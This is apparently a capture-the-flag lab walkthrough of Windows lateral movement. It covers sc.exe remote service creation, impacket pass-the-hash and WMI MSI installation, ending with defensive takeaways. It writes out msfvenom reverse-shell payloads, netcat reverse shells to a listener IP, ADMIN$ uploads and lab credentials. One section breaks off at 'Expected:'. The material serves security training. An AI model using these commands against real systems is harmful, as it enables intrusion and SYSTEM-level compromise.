## Part A — Remotely Creating Services with `sc.exe` (manual PsExec internals)

This reproduces exactly what PsExec does under the hood: authenticate over SMB, upload a **service binary** to `ADMIN$`, then create and start a service to run it. Doing it manually (no Metasploit) mirrors OSCP-style restrictions and builds real understanding.

### Step 1 — Create a service binary + listener (on Kali)

A **service-compatible** binary is required (`-f exe-service`). A standard EXE is killed by the Service Control Manager within a minute or two because it doesn't respond to service control signals, breaking the shell.

```
msfvenom -p windows/x64/shell_reverse_tcp -f exe-service LHOST=10.150.74.24 LPORT=4444 -o testservice.exe
```
```
rlwrap -cAr nc -lvnp 4444
```
Set `LHOST` to your VPN IP on the Lateral Movement network. Give the binary a unique name (the lab is shared).

### Step 2 — SSH into the initial user

```
ssh za\\damien.horton@thmjmp2.za.tryhackme.com
```
You now have a command prompt on `THMJMP2`. This does not grant admin on `THMIIS` — use the separate captured admin credentials for that.

### Step 3 — Upload the service binary to THMIIS via `ADMIN$`

`ADMIN$` maps to the remote `C:\Windows` directory. Upload using the captured admin user's context:

```
smbclient -c 'put testservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```
The file lands at `C:\Windows\testservice.exe` on **THMIIS** (not THMJMP2). No connection arrives yet — the EXE just sits on disk until started as a service.

> If the lab resets mid-upload (shared infrastructure), wait for the VMs/DC to boot, reconnect via SSH, and retry.

### Step 4 — Spawn a shell with the admin user's access token (`runas /netonly`)

`sc.exe` has no option to supply credentials, so we need to run it under `t1_leonard.summers`'s network context. Standard `runas` spawns a new `cmd.exe` **window** in an interactive desktop session — but we only have an SSH terminal, so that window would be unreachable. Solution: use `runas /netonly` to launch `nc64.exe` and get a **second reverse shell** under that network identity.

Start a second listener (different port) on Kali:
```
rlwrap -cAr nc -lvnp 4443
```

THMIIS already has `nc64.exe` in `C:\tools` (otherwise upload it via smbclient). From the SSH session run:
```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.150.74.24 4443"
```
Enter the password `EZpass4ever` when prompted.

> **Note:** `/netonly` does **not** validate the password immediately — it only uses the credentials for *outbound network authentication*. A mistyped password surfaces later as ACCESS DENIED errors. Type it correctly.

Receive the shell on Kali:
```
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap -cAr nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.150.74.24] from (UNKNOWN) [10.200.74.249] 62302
Microsoft Windows [Version 10.0.14393]

C:\Windows\system32>whoami
za\damien.horton
```
`whoami` still shows `damien.horton` (the local identity), but **outbound network connections from this shell now authenticate as `t1_leonard.summers`**.

### Step 5 — Create and start the service on THMIIS

From the network-authenticated shell:
```
sc.exe \\thmiis.za.tryhackme.com create THMservice-11112 binPath= "%windir%\testservice.exe" start= auto
```
(`%windir%` = `C:\Windows`, the default path.) Expected:
```
[SC] CreateService SUCCESS
```
Start it:
```
sc.exe \\thmiis.za.tryhackme.com start THMservice-11112
```
The reverse shell lands on the port-4444 listener:
```
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.150.74.24] from (UNKNOWN) [10.200.74.201] 49435
Microsoft Windows [Version 10.0.17763.1098]

C:\Windows\system32>whoami
nt authority\system
```
When a service is registered and started under an admin domain account, it runs as **`NT AUTHORITY\SYSTEM`** by default.

### The two listeners (not duplicates)

| Port | Purpose | Connecting machine |
|---|---|---|
| `4443` | Interactive shell created via `runas /netonly` | `THMJMP2` |
| `4444` | Reverse shell from the service payload | `THMIIS` |

### `runas /netonly` in one line

`runas /netonly` runs a program **locally** but uses the specified credentials for **outgoing network authentication**. It does **not** change your local user identity, does **not** make you a local admin, and does **not** validate the password immediately.

| Question | Answer |
|---|---|
| Did `runas /netonly` move you to THMIIS? | No. The process still ran on THMJMP2. |
| Did it make you local admin on THMJMP2? | No. |
| What did it change? | The credentials available for outbound network authentication. |
| Why was it needed? | To let `sc.exe` authenticate to THMIIS as the admin account. |
| What executed the payload on THMIIS? | The remote Service Control Manager started the configured service. |

**Memory trick:** `runas /netonly` = run locally, authenticate remotely with another account.

### Troubleshooting checklist

| Symptom | What to investigate |
|---|---|
| SSH connection fails | VPN, hostname resolution, assigned credentials |
| SMB upload fails | Username/domain, password, `ADMIN$` access, connectivity |
| Port 4443 receives no connection | Reverse-shell callback address, listener, local firewall, `runas` process |
| `sc.exe` returns Access Denied | Credentials, target admin privileges, SMB/RPC access |
| Service starts but port 4444 receives nothing | Payload path, service status, callback address/port, routing/firewall |
| Shell connects but flag inaccessible | Which machine/user context the shell actually represents |

> `ATTACKER_IP` must be reachable from the lab target (your VPN IP), not your laptop's local Wi-Fi address.

## Part B — PsExec: Pass the Hash (Impacket)

The automated version of the same workflow. Convert the captured password to its NT hash, then pass the hash.

Credentials: `ZA.TRYHACKME.COM\t1_leonard.summers` / `EZpass4ever`.

Create a script to compute the NT hash:
```
nano nthash.py
```
```python
from impacket.ntlm import compute_nthash

password = input("Password: ")
print(compute_nthash(password).hex())
```
Run it and enter the password:
```
python3 nthash.py
```
```
58aac41fe58801cbc74462630b1bdd43
```

Pass the hash with `impacket-psexec` (LM portion left empty before the colon):
```
impacket-psexec ZA/t1_leonard.summers@thmiis.za.tryhackme.com -hashes :58aac41fe58801cbc74462630b1bdd43
```
Expected:

## Part C — Moving Laterally Using WMI (Task 4)

Same lateral movement (`THMJMP2 → THMIIS`), but instead of `sc.exe`/PsExec you use **WMI** to install an **MSI package** that triggers a reverse shell. WMI is the remote management mechanism; the MSI is the package; the reverse shell is the resulting connection.

**Credentials for this task:** `t1_corine.waters` / `Korine.1994` (different from the previous task).

### Step 1 — Create an MSI reverse shell + listener (on Kali)

```
msfvenom -p windows/x64/shell_reverse_tcp -f msi LHOST=10.150.74.24 LPORT=4444 -o myinstaller.msi
```
```
rlwrap -cAr nc -lvnp 4444
```
The callback IP/port (`LHOST`/`LPORT`) are **embedded in the MSI** at generation time — this is why you don't specify your Kali IP again in the later PowerShell commands.

### Step 2 — SSH into the initial user

```
ssh za\\damien.horton@thmjmp2.za.tryhackme.com
```

### Step 3 — Upload the MSI to THMIIS via `ADMIN$`

```
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```
`ADMIN$` = `C:\Windows`, so the file lands at `C:\Windows\myinstaller.msi` on THMIIS.

### Step 4 — Spawn a shell with the admin user's token

Upload netcat if needed, start a second listener, and `runas /netonly` into a shell as `t1_corine.waters` (same pattern as Part A):
```
smbclient -c 'put nc64.exe' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```
```
rlwrap -cAr nc -lvnp 4443
```
From the first user's shell:
```
runas /netonly /user:ZA.TRYHACKME.COM\t1_corine.waters "c:\tools\nc64.exe -e cmd.exe 10.150.74.24 4443"
```
Enter `Korine.1994`. The 4443 shell shows `za\damien.horton` for `whoami` / `THMJMP2` for `hostname`, but authenticates outbound as `t1_corine.waters`.

### Step 5 — Install the MSI through WMI (PowerShell CIM over DCOM)

On the new shell, start PowerShell and run these one by one:
```powershell
powershell.exe
```
```powershell
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

The reverse shell lands on the port-4444 listener:
```
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.150.74.24] from (UNKNOWN) [10.200.74.201] 62463
Microsoft Windows [Version 10.0.17763.1098]

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
THMIIS
```

### What each PowerShell command does

| Command | What it does |
|---|---|
| `powershell.exe` | Starts PowerShell inside the netcat shell on THMJMP2 |
| `$username` | Stores the account name for remote WMI auth |
| `$password` | Stores the password (plaintext string — exposed in history/memory; `Read-Host -AsSecureString` is safer) |
| `ConvertTo-SecureString ... -AsPlainText -Force` | Converts the plaintext password to a `SecureString` (`-Force` confirms intent) |
| `New-Object ... PSCredential` | Packages username + secure password into a credential object (does **not** authenticate by itself) |
| `New-CimSessionOption -Protocol DCOM` | Selects **DCOM** as the WMI transport (over RPC) |
| `New-CimSession` | Establishes the remote CIM/WMI management session to THMIIS (`-ErrorAction Stop` makes errors terminating). A CIM session is a **management connection**, not an interactive shell. |
| `Invoke-CimMethod ... Win32_Product Install` | Calls the `Install` method on the remote `Win32_Product` class; `PackageLocation` is the MSI path **on THMIIS** |

**Transport ports:** DCOM-based WMI typically needs **TCP 135** (RPC Endpoint Mapper) plus a dynamic RPC port. The alternative transport is **WSMan** (WinRM) over TCP 5985/5986.

> `Win32_Product` is a legacy WMI class that can trigger Windows Installer consistency checks — not recommended for routine inventory/deployment, but used here to demonstrate the technique.

### Why the shell comes back as SYSTEM

The connection comes from `10.200.74.201` (THMIIS), `whoami` returns `nt authority\system`, and `hostname` returns `THMIIS`. The Windows Installer execution context determines the payload's privileges; in this lab it yields a SYSTEM shell. **SYSTEM** is a highly privileged local account, not the same as the domain user `t1_corine.waters`.

### Component responsibilities

| Component | Responsibility |
|---|---|
| `msfvenom` | Generates the MSI payload with embedded callback IP/port |
| `smbclient` | Copies the MSI to the target `ADMIN$` |
| `PSCredential` | Packages the credentials |
| `New-CimSession` | Establishes the remote management connection |
| WMI / `Win32_Product` | Requests the MSI installation |
| Windows Installer | Performs the installation operation |
| MSI payload | Initiates the reverse connection to `10.150.74.24:4444` |
| Netcat listener | Accepts the incoming connection |

**Payload vs. listener:** you configured the destination **once** when generating the MSI. Uploading and installing it caused that preconfigured callback to run — the WMI command never says "connect to Kali," it just requests an installation; the payload carries the connection instructions. The reverse connection and the WMI call serve different purposes: WMI asks the target to perform an operation; the reverse shell gives you an interactive channel to the resulting process.

### Troubleshooting checklist (WMI)

- `t1_corine.waters` credentials are correct.
- MSI uploaded to the intended THMIIS path.
- Callback address reachable from THMIIS.
- Listener/handler payload, address, and port match the generated package.
- WMI session created successfully.
- Install method returned a successful result.
- Target firewall and lab network permit the callback.

> A successful WMI method call does **not** guarantee the package installed or a shell was established — check the method's return value and the target's logs.

## Key Takeaways

- Sequence to remember: **Credentials → CIM session → remote WMI method → MSI installation → reverse connection → SYSTEM shell.**
- `runas /netonly` solves the outbound-credential problem from the jump host; `sc.exe` / WMI provides the remote execution mechanism on the target.
- Both `sc.exe` and tools like `psexec.py` accomplish the same outcome — tools just automate the manual process.
- Defensive takeaways: restrict write access to `ADMIN$` and remote WMI permissions; monitor remote service creation, remote management activity, unexpected MSI installations, and unusual SYSTEM processes.
